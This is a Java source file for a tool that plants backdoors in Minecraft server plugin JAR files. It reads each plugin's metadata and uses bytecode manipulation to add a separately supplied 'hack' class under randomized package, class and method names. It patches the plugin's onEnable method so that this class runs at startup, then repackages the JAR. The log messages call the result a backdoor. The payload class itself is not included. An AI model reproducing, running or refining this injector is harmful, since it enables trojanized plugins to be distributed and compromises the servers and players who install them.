package ru.hastg9;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.NotFoundException;
import javassist.bytecode.ClassFile;
import org.apache.commons.io.FileUtils;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.nio.file.FileSystem;
import java.nio.file.*;
import java.util.Enumeration;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

public class Injector {

    private final Logger LOGGER = LogManager.getLogger(getClass().getSimpleName());

    private final String injectFileName;

    private int SK = 0, SU = 0;

    public Injector(String injectFileName) {
        this.injectFileName = injectFileName;
    }

    public void inject(String input, String output) {
        try {
            File tmp = new File("tmp");
            if(!tmp.exists()) tmp.mkdir();
            FileUtils.cleanDirectory(tmp);
        } catch (IOException ex) {
            LOGGER.error("An error occurred while creating temp dir!");
            LOGGER.trace(ex.getMessage(), ex);
        }

        File inDir = FileUtils.getFile(input);
        if(inDir.isDirectory())
            injectDir(input, output, Settings.THREADS);
        else
            injectFile(input, output);
    }

    public void injectDir(String inputDir, String outputDir, int threads) {
        File inDir = FileUtils.getFile(inputDir);
        File outDir = FileUtils.getFile(outputDir);

        if (!inDir.exists()) {
            LOGGER.error("Directory \"" + inDir.getName() + "\" does not exist, skip...");
            inDir.mkdir();

            return;
        }

        if(!outDir.exists()) outDir.mkdir();

        File[] plugins = inDir.listFiles((dir, name) -> name.endsWith(".jar"));

        if(plugins == null) {
            LOGGER.error("Directory \"" + inDir.getName() + "\" does not contain plugins.");
            return;
        }

        LOGGER.info("Found {} plugins.", plugins.length);
        LOGGER.info("Number of threads: {}", threads);

        ExecutorService executor = Executors.newFixedThreadPool(threads);

        for(File file : plugins) {
            executor.execute(() -> injectFile(file.getPath(), outputDir + File.separator + file.getName()));
        }

        executor.shutdown();

        try {
            executor.awaitTermination(Long.MAX_VALUE, TimeUnit.NANOSECONDS);

            LOGGER.info("DONE!");

            System.out.println("\n╔══════════════════════════════════════╗");
            System.out.printf("║ Patched plugins: %d\n", SU);
            System.out.printf("║ Skipped plugins: %d\n", SK);
            System.out.println("╚══════════════════════════════════════╝\n");

        } catch (Exception ex) {
            LOGGER.warn("An error occurred: {}", ex.getMessage());
            LOGGER.trace(ex.getMessage(), ex);
        }

    }

    public void injectFile(String inputFile, String outputFile) {
        File inFile = FileUtils.getFile(inputFile);
        File outFile = FileUtils.getFile(outputFile);

        if (!inFile.exists()) {
            LOGGER.error("File \"" + inFile.getName() + "\" does not exist, skip...");
            SK++;
            return;
        }

        try {
            FileUtils.copyFile(inFile, outFile, StandardCopyOption.REPLACE_EXISTING);
            Map<String, Object> pluginMeta = readPluginMeta(inFile.getAbsolutePath());

            String NAME = (String)pluginMeta.get("name");
            String MAIN = (String)pluginMeta.get("main");

            File tmp = new File("tmp", NAME);
            if(!tmp.exists()) tmp.mkdir();

            try {
                LOGGER.info("[{}] Patching: {}", NAME, inFile.getName());
                LOGGER.info("[{}] Found main class: {}", NAME, MAIN);
                ClassPool pool = new ClassPool(ClassPool.getDefault());

                String packageName = RandomStringUtils.randomAlphanumeric(25);
                String className = RandomStringUtils.randomAlphabetic(25);
                String methodName = "func" + RandomStringUtils.randomNumeric(10);

                ClassFile classFile = null;

                try {
                    LOGGER.info("[{}] Loading Backdoor . . .", NAME);
                    classFile = loadHackApi(packageName, className, methodName);
                }
                catch (IOException ex) {
                    LOGGER.warn("[{}] An error occurred while loading Backdoor: {}", NAME, ex.getMessage());
                    LOGGER.trace(ex.getMessage(), ex);

                    return;
                }

                try {
                    pool.appendClassPath(inputFile);
                    pool.appendClassPath(Settings.SERVER_API_PATH);
                } catch (NotFoundException ex) {
                    LOGGER.warn("[{}] An error occurred when linking libraries: {}", NAME, ex.getMessage());
                    LOGGER.trace(ex.getMessage(), ex);

                    return;
                }

                pool.makeClass(classFile);

                File hackClass = FileUtils.getFile(tmp.getPath(), packageName, className + ".class");
                FileUtils.createParentDirectories(hackClass);
                FileUtils.touch(hackClass);

                classFile.write(new DataOutputStream(new FileOutputStream(tmp.getPath() + File.separator + packageName + File.separator + className + ".class")));

                CtClass cc = pool.get(MAIN);

                CtMethod m = cc.getDeclaredMethod("onEnable");

                m.insertAfter("{ "+ packageName +"."+className+"."+methodName+"(this); }");

                cc.writeFile(tmp.toString());
                File patched = FileUtils.getFile(tmp.getPath(), MAIN.replace(".", "/") + ".class");

                FileSystem outStream = FileSystems.newFileSystem(outFile.toPath(), (ClassLoader)null);
                Path targetCLASS = outStream.getPath("/" + MAIN.replace(".", "/") + ".class");

                LOGGER.info("[{}] Injecting patched main class . . .", NAME);

                Files.copy(patched.toPath(), targetCLASS, StandardCopyOption.REPLACE_EXISTING);

                Path targetHackClass = outStream.getPath("/" + packageName + "/" + className + ".class");

                LOGGER.info("[{}] Injecting hack api class . . .", NAME);
                Files.createDirectory(targetHackClass.getParent());
                Files.copy(hackClass.toPath(), targetHackClass, StandardCopyOption.REPLACE_EXISTING);

                outStream.close();

                LOGGER.info("[{}] Backdoor injected successfully!", NAME);

                SU++;
            } catch (Exception ex) {
                LOGGER.warn("[{}] An error occurred while patching plugin!", NAME);
                LOGGER.trace(ex.getMessage(), ex);
                SK++;
            }

    } catch (IOException ex) {
            LOGGER.error("{} An error occurred while patching plugin!", inputFile);
            LOGGER.trace(ex.getMessage(), ex);
            SK++;
        }
    }

    public ClassFile loadHackApi(String packageName, String className, String methodName) throws IOException {
        File parent = new File("inject");

        if(!parent.exists()) {
            parent.mkdir();

            throw new FileNotFoundException("Directory " + parent.getName() + " does not exist!");
        }

        File injectFile = new File(parent, injectFileName);

        if(!injectFile.exists())
            throw new FileNotFoundException("File " + injectFileName + " does not exist!");

        DataInputStream hackAPI = new DataInputStream(new FileInputStream(injectFile));
        ClassFile classFile = new ClassFile(hackAPI);
        classFile.setName(packageName + "." + className);
        classFile.getMethod("hack").setName(methodName);

        LOGGER.debug("Patched class name: {}", classFile.getName());
        LOGGER.debug("Patched method name: {}", methodName);

        return classFile;
    }


    public Map<String, Object> readPluginMeta(String pluginPath) throws IOException {
        Yaml yaml = new Yaml();
        InputStream inputStream = null;

        JarFile jarFile = new JarFile(pluginPath);
        Enumeration<JarEntry> entries = jarFile.entries();

        while (entries.hasMoreElements()) {
            JarEntry entry = entries.nextElement();
            if(entry.getName().equals("plugin.yml")) {
                LOGGER.debug("Plugin meta found: "+entry.getName());

                inputStream = jarFile.getInputStream(entry);

            }
        }
        return (Map<String, Object>)yaml.load(inputStream);
    }

    private static void deleteDir(File file) {
        File[] contents = file.listFiles();
        if (contents != null)
            for (File f : contents) {
                if (!Files.isSymbolicLink(f.toPath()))
                    deleteDir(f);
            }
        file.delete();
    }



}
